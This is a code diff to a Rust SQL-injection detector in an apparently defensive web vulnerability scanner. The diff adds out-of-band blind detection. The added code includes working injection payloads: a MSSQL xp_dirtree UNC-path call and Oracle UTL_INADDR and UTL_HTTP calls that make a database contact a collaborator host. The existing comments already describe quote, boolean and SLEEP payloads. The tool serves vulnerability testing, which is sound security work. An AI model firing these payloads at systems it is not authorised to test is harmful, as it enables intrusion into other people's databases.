@@ -18,6 +18,10 @@
 //! time-based:    value' AND SLEEP(2)   → the response takes ~2s longer
 //!                value' AND SLEEP(4)   → ~4s longer, so the wait tracks the number asked.
 //!                The blind case: nothing of the result shows, but the server waits.
+//!
+//! out-of-band:   value';EXEC master..xp_dirtree '\\<token>.collab\a'  → a DNS/SMB callback
+//!                The last resort: the query cannot be seen or timed, but the database can
+//!                be made to reach a collaborator, and the callback proves the input ran.
 //! ```
 //!
 //! The time-based test is the one for a query whose result never reaches the response —
@@ -47,14 +51,15 @@ use async_trait::async_trait;
 use nullhawk_types::finding::{
     Evidence, FindingSource, Hypothesis, Location, MessagePart, Severity,
 };
+use nullhawk_types::ids::InteractionId;
 use nullhawk_types::inject::{inputs, inputs_in, substitute, value_at};
 use nullhawk_types::object::ObjectLocation;
 use nullhawk_types::verify::{
     DetectorId, DetectorInfo, DetectorMode, Support, Verification, Writeup,
 };
 use nullhawk_types::Result;
-use nullhawk_verify::Lab;
-use std::time::Instant;
+use nullhawk_verify::{Canary, Lab};
+use std::time::{Duration, Instant};
 
 use crate::{ActiveCheck, Budget, Subject};
 
@@ -67,6 +72,11 @@ const DELAY_SECS: u64 = 2;
 /// told from an injected delay rather than mistaken for one.
 const BASELINE_SAMPLES: usize = 3;
 
+/// How long to wait for an out-of-band callback, and how often to check. A database that
+/// reaches out does so on its own schedule, so the token is polled a handful of times.
+const CALLBACK_POLLS: usize = 6;
+const CALLBACK_INTERVAL: Duration = Duration::from_millis(750);
+
 /// The check.
 pub struct SqlInjection;
 
@@ -76,7 +86,7 @@ const SETTLES: &str = "input.sqli";
 const INFO: DetectorInfo = DetectorInfo {
     id: DetectorId("input.sqli"),
     name: "SQL injection",
-    version: "1.1.0",
+    version: "1.2.0",
     about: "whether an input is concatenated into a SQL query — by the error an \
             unbalanced quote raises, or a boolean condition the response tracks",
     mode: DetectorMode::Active,
@@ -251,11 +261,26 @@ impl ActiveCheck for SqlInjection {
             }
         }
 
+        // ---- out-of-band blind ----
+        //
+        // The last resort, for a sink that neither reflects a result nor can be timed —
+        // a database whose sleep is disabled or filtered, or a query whose delay is lost
+        // in a queue. Some engines can be made to reach out: MSSQL walks a UNC path,
+        // Oracle resolves a host or fetches a URL. Point one at the collaborator and a
+        // callback bearing the planted token proves the input reached the query. Only when
+        // the run has a collaborator; without one this stays the honest refuted below.
+        if let Some(canary) = lab.canary() {
+            if let Some(verdict) = out_of_band(subject, lab, &slot, &base, canary, budget).await {
+                return Ok(verdict);
+            }
+        }
+
         Ok(Verification::Refuted {
             note: format!(
                 "no database error surfaced from an unbalanced quote in {}, boolean \
-                 payloads did not change the response, and a sleep payload did not delay \
-                 it — this input shows no sign of reaching a SQL query unsanitised",
+                 payloads did not change the response, a sleep payload did not delay it, \
+                 and no out-of-band callback arrived — this input shows no sign of \
+                 reaching a SQL query unsanitised",
                 describe(&slot),
             ),
         })
@@ -493,6 +518,109 @@ async fn time_based(
                     },
                 ],
             });
+        }
+    }
+    None
+}
+
+/// OOB payloads by engine, at a canary host `h` (token-bearing in subdomain mode) and a
+/// canary URL `u`. The engines that can be made to reach out: MSSQL walks a UNC path
+/// (a DNS lookup of the host), Oracle resolves a host or fetches a URL. Each is sent with
+/// its own minted canary so a callback names the engine that made it.
+fn oob_payloads(base: &str, h: &str, u: &str) -> Vec<(&'static str, String)> {
+    vec![
+        (
+            "Microsoft SQL Server",
+            format!("{base}';EXEC master..xp_dirtree '\\\\{h}\\a';-- -"),
+        ),
+        (
+            "Oracle",
+            format!("{base}' AND UTL_INADDR.GET_HOST_ADDRESS('{h}') IS NOT NULL-- -"),
+        ),
+        (
+            "Oracle",
+            format!("{base}' AND UTL_HTTP.REQUEST('{u}') IS NOT NULL-- -"),
+        ),
+    ]
+}
+
+/// The host of a URL, without scheme, port or path — for a UNC or host-resolution payload.
+/// In a subdomain-mode canary this label carries the token.
+fn host_of(url: &str) -> String {
+    let after = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
+    let hostport = after.split(['/', '?']).next().unwrap_or(after);
+    hostport.split(':').next().unwrap_or(hostport).to_string()
+}
+
+/// The out-of-band experiment. Sends one payload per engine, each carrying its own canary,
+/// then polls for a callback. A hit proves the input reached a query even though nothing
+/// of the result — content, timing — came back. `None` when nothing could be sent or
+/// nothing called back in the window, which the caller turns into the honest refuted.
+async fn out_of_band(
+    subject: &Subject,
+    lab: &dyn Lab,
+    slot: &ObjectLocation,
+    base: &str,
+    first: Canary,
+    budget: &Budget,
+) -> Option<Verification> {
+    // Each payload carries its own minted canary, so a callback names the engine that
+    // made it. Indexed rather than keyed by engine name — two of the templates are Oracle,
+    // and matching by name would send one of them twice and the other never.
+    let mut sent: Vec<(&'static str, String, nullhawk_types::ids::RequestId)> = Vec::new();
+    let mut spent = 0usize;
+    let count = oob_payloads(base, "", "").len();
+
+    for i in 0..count {
+        if spent >= budget.per_hypothesis.max(1) {
+            break;
+        }
+        let canary = if i == 0 {
+            first.clone()
+        } else {
+            match lab.canary() {
+                Some(canary) => canary,
+                None => break,
+            }
+        };
+        let built = oob_payloads(base, &host_of(&canary.url), &canary.url);
+        let (engine, payload) = &built[i];
+        if let Attempt::Answered(answer) = probe(subject, lab, slot, payload).await {
+            sent.push((engine, canary.token.clone(), answer.request));
+            spent += 1;
+        }
+    }
+    if sent.is_empty() {
+        return None;
+    }
+
+    for _ in 0..CALLBACK_POLLS {
+        tokio::time::sleep(CALLBACK_INTERVAL).await;
+        for (engine, token, request) in &sent {
+            let Ok(interactions) = lab.interactions(token).await else {
+                continue;
+            };
+            if let Some(hit) = interactions.into_iter().next() {
+                return Some(Verification::Reproduced {
+                    note: format!(
+                        "{} reached a SQL query: an {engine} out-of-band payload caused a \
+                         {} interaction to the collaborator from {}, carrying the token \
+                         planted only in that request. Nothing of the query's result came \
+                         back — this is a blind, out-of-band SQL injection",
+                        describe(slot),
+                        hit.protocol,
+                        hit.source,
+                    ),
+                    evidence: vec![
+                        from_exchange(subject),
+                        Evidence::OutOfBand {
+                            request: *request,
+                            interaction: InteractionId::new(),
+                            protocol: hit.protocol,
+                        },
+                    ],
+                });
+            }
         }
     }
     None
@@ -753,6 +881,30 @@ mod tests {
         assert!(scales(2100, 4100, d));
         // A one-off slow D probe that does not grow at 2D is not an injection.
         assert!(!scales(2100, 2200, d));
+    }
+
+    #[test]
+    fn the_oob_payloads_reach_out_through_the_canary_host_and_url() {
+        let ps = oob_payloads("x", "tok.collab.example", "http://tok.collab.example/p");
+        let joined = ps
+            .iter()
+            .map(|(_, p)| p.as_str())
+            .collect::<Vec<_>>()
+            .join("\n");
+        // MSSQL walks a UNC path to the canary host (a DNS lookup).
+        assert!(
+            joined.contains(r"xp_dirtree '\\tok.collab.example\a'"),
+            "{joined}"
+        );
+        // Oracle resolves the host, and fetches the URL.
+        assert!(joined.contains("UTL_INADDR.GET_HOST_ADDRESS('tok.collab.example')"));
+        assert!(joined.contains("UTL_HTTP.REQUEST('http://tok.collab.example/p')"));
+    }
+
+    #[test]
+    fn the_canary_host_is_stripped_to_a_bare_label() {
+        assert_eq!(host_of("http://tok.collab.example/p"), "tok.collab.example");
+        assert_eq!(host_of("http://127.0.0.1:8888/tok"), "127.0.0.1");
     }
 
     #[test]
